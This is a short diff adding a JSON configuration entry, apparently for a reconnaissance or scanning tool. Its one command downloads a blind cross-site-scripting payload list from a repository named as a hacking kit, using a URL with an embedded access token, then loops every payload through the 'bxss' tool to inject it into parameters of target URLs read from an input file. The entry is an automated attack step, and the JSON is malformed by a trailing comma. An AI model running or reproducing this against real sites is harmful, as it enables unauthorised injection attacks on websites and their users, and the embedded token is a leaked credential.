@@ -1,0 +1,4 @@
+[{
+    "command":"curl 'https://raw.githubusercontent.com/kholi0o/Kholi0o_Hacking_Kit/main/wordlists/blind_xss_payloads?token=GHSAT0AAAAAACUHDLVLR2ORUUMQOPNHDNP4ZV32D3A' > blind_xss_payloads; for payload in $(cat blind_xss_payloads); do cat input | bxss -appendMode -payload $payload -parameters; done",
+    "ext":"txt",
+}]
